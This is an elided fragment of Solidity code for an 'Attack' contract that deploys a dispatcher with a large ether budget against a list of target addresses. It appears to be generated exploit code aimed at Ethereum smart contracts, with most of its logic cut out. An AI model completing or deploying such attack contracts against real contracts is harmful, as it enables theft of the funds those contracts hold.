 ...
 * parameter. Make sure to send at least 203588 ether and 360770741650587649 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x2b1c8c1227a000000000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x2b1c8c1227a000000001; /* equals 203588 ether and 360770741650587649 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 203588360770741650587648 }(0, _targets);
    }
